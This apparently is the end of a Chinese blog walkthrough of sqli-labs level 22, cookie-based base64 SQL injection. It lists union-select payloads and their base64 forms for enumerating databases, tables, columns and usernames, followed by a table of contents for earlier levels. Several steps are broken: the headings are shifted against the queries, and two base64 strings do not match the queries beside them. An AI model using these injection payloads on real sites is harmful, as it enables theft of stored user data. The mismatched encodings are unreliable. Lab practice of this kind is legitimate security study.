+</code></pre>
+<h1 id="第二十二关cookie-base64编码注入双引号">第二十二关：Cookie base64编码注入+双引号</h1>
+<p>基于 “ 的cookie的base64编码注入</p>
+<pre><code>Post data: uname=admin&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>数据库名</p>
+<pre><code>uname=0&quot; order by 1,2,3,4,5 #
+Base64:uname=MCIgb3JkZXIgYnkgMSwyLDMsNCw1ICM=
+</code></pre>
+<p>表名</p>
+<pre><code>uname=0&quot; union select 1,2,group_concat(schema_name) from information_schema.schemata #
+Base64:uname=MCIgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoc2NoZW1hX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhICM=
+</code></pre>
+<p>列名</p>
+<pre><code>uname=0&quot; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #
+Base64:uname=MCIgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpICM=
+</code></pre>
+<p>表名</p>
+<pre><code>uname=0&quot; union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'#
+Base64:uname=MCIgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpICM=
+</code></pre>
+<p>表数据<br>
+uname=0&quot; union select 1,2,group_concat(username) from users#<br>
+Base64:uname=MCIgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnIw==</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E7%AC%AC%E4%B8%80%E5%85%B3get%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5">第一关：GET字符型注入</a></li>
+<li><a href="#%E7%AC%AC%E4%BA%8C%E5%85%B3get%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5">第二关:GET数字型注入</a></li>
+<li><a href="#%E7%AC%AC%E4%B8%89%E5%85%B3get%E5%8D%95%E5%BC%95%E5%8F%B7%E6%9E%84%E9%80%A0%E9%97%AD%E5%90%88">第三关：GET单引号构造闭合</a></li>
+<li><a href="#%E7%AC%AC%E5%9B%9B%E5%85%B3get%E5%8F%8C%E5%BC%95%E5%8F%B7%E9%97%AD%E5%90%88sql%E8%AF%AD%E5%8F%A5">第四关：GET双引号闭合sql语句</a></li>
+<li><a href="#%E7%AC%AC%E4%BA%94%E5%85%B3-get%E5%8D%95%E5%BC%95%E5%8F%B7%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">第五关 ：GET单引号盲注和报错注入</a></li>
+<li><a href="#%E7%AC%AC%E5%85%AD%E5%85%B3get%E5%8F%8C%E5%BC%95%E5%8F%B7%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E4%B8%8E%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">第六关：GET双引号时间盲注与报错注入</a></li>
+<li><a href="#%E7%AC%AC%E5%85%AB%E5%85%B3get%E5%8D%95%E5%BC%95%E5%8F%B7%E7%9B%B2%E6%B3%A8%E6%97%A0%E6%8A%A5%E9%94%99">第八关：GET单引号盲注+无报错</a></li>
+<li><a href="#%E7%AC%AC%E4%B9%9D%E5%85%B3get-%E7%9B%B2%E6%B3%A8-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4-%E5%8D%95%E5%BC%95%E5%8F%B7">第九关：GET - 盲注 - 基于时间 - 单引号</a></li>
+<li><a href="#%E7%AC%AC%E5%8D%81%E5%85%B3-get-%E7%9B%B2%E6%B3%A8-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4-%E5%8F%8C%E5%BC%95%E5%8F%B7">第十关： GET - 盲注 - 基于时间 - 双引号</a></li>
+<li><a href="#%E7%AC%AC%E5%8D%81%E4%B8%80%E5%85%B3post%E5%8D%95%E5%BC%95%E5%8F%B7%E6%B3%A8%E5%85%A5">第十一关：POST单引号注入</a></li>
+<li><a href="#%E7%AC%AC%E5%8D%81%E4%B8%89%E5%85%B3post%E5%8D%95%E5%BC%95%E5%8F%B7%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">第十三关：POST单引号盲注和报错注入</a></li>
+<li><a href="#%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%85%B3%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%9B%B2%E6%B3%A8%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">第十四关：双引号盲注+报错注入</a></li>
+<li><a href="#%E7%AC%AC%E5%8D%81%E4%BA%94%E5%85%B3post%E5%8D%95%E5%BC%95%E5%8F%B7%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8">第十五关：POST单引号布尔盲注</a></li>
+<li><a href="#%E7%AC%AC%E5%8D%81%E5%85%AD%E5%85%B3post%E5%8F%8C%E5%BC%95%E5%8F%B7%E9%97%AD%E5%90%88%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8">第十六关：POST双引号闭合布尔盲注</a></li>
+<li><a href="#%E7%AC%AC%E5%8D%81%E4%B8%83%E5%85%B3%E5%B7%B2%E7%9F%A5%E4%B8%80%E5%AD%97%E6%AE%B5%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8F%A6%E4%B8%80%E5%AD%97%E6%AE%B5">第十七关:已知一字段过滤，单引号报错注入另一字段</a></li>
+<li><a href="#%E7%AC%AC%E5%8D%81%E5%85%AB%E5%85%B3ua%E6%B3%A8%E5%85%A5%E5%8D%95%E5%BC%95%E5%8F%B7%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">第十八关：UA注入+单引号报错注入</a></li>
+<li><a href="#less-19%E5%9F%BA%E4%BA%8E%E7%9A%84referer%E6%8A%A5%E5%A4%B4%E6%96%87%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">less-19——基于’的Referer:报头文报错注入</a></li>
+<li><a href="#%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3cookie%E6%B3%A8%E5%85%A5%E5%8D%95%E5%BC%95%E5%8F%B7">第二十关：Cookie注入+单引号</a></li>
+<li><a href="#%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E5%85%B3cookie-base64%E7%BC%96%E7%A0%81%E6%B3%A8%E5%85%A5%E5%8D%95%E5%BC%95%E5%8F%B7%E6%8B%AC%E5%8F%B7%E9%97%AD%E5%90%88">第二十一关：Cookie base64编码注入+单引号括号闭合</a></li>
+<li><a href="#%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%85%B3cookie-base64%E7%BC%96%E7%A0%81%E6%B3%A8%E5%85%A5%E5%8F%8C%E5%BC%95%E5%8F%B7">第二十二关：Cookie base64编码注入+双引号</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://https://jinqipiaopiao.github.io/post/sql-shou-dong-zhu-ru-jing-yan-zong-jie/">
+              <h3 class="post-title">
+                sql手动注入经验总结
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://https://jinqipiaopiao.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
